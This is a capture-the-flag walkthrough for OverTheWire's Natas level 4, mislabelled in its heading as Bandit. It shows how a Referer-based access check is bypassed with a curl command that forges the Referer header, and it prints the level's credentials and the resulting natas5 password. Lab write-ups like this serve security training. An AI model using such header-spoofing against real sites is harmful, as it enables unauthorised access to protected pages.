# BANDIT LEVEL 4

```
http://overthewire.org/wargames/natas/natas4.html
```

```
Username: natas4
Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
URL:      http://natas4.natas.labs.overthewire.org
```

<img src='index.jpg' width=500px>

### SOLUTION

We are greeted with the following message..

```
Access disallowed. You are visiting from "" while authorized users should come only from
"http://natas5.natas.labs.overthewire.org/" 
```

.. feels like a cookie or a header is being used to supply this location. Let's inspect..

```
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Connection: keep-alive
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Upgrade-Insecure-Requests: 1
DNT: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://natas4.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: __cfduid=d773051550db82f7a8a4d2154d95cf23b1539528567; __utmc=176859643; __utmz=176859643.1540523077.10.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utma=176859643.380347011.1539528564.1540653662.1540658153.12
```

We see there is a REFERER request header that looks promising.

```
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer

The `Referer` request header contains the address of the previous web page from which a 
link to the currently requested page was followed. The `Referer` header allows servers to
identify where people are visiting them from and may use that data for analytics, logging,
or optimized caching, for example.
```

So let's try modifying this value before sending it onto the server..

```
$ curl 'http://natas4.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va' -H 'Referer: http://natas5.natas.labs.overthewire.org/'
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

Using the Chrome extension `Modify Headers`, we can achieve the same effect within the
browser..

<img src='chrome-mod-header.jpg' width=500px>
